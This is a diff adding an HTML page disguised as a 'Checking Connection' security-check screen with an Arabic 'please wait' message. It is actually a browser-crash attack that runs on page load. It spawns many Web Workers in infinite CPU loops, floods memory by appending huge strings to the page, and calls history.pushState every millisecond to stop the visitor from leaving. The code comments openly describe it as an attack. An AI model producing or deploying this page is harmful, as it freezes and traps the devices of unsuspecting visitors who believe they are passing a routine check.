@@ -1,0 +1,45 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Connection...</title>
+</head>
+<body>
+    <script>
+        // كود العامل (الذي سيتم تشغيله في الخلفية)
+        const workerCode = `
+            while (true) {
+                // استهلاك مكثف للمعالج
+                Math.sqrt(Math.random() * 10000000);
+                postMessage("bomb");
+            }
+        `;
+
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+
+        function startAttack() {
+            // تشغيل عدد كبير من العمال بناءً على عدد نويات المعالج
+            const cores = navigator.hardwareConcurrency || 16;
+            for (let i = 0; i < cores * 4; i++) {
+                const worker = new Worker(workerUrl);
+                
+                // إغراق الذاكرة (RAM) من داخل العامل
+                worker.onmessage = function() {
+                    let huge = new Array(1000000).fill("FREEZE").join("");
+                    document.body.innerHTML += huge;
+                };
+            }
+            
+            // قفل سجل التصفح لمنع الخروج
+            setInterval(() => {
+                history.pushState(null, null, location.href);
+            }, 1);
+        }
+
+        window.onload = startAttack;
+    </script>
+    <h1 style="text-align: center; margin-top: 20%;">جاري فحص الأمان... يرجى الانتظار</h1>
+</body>
+</html>
+
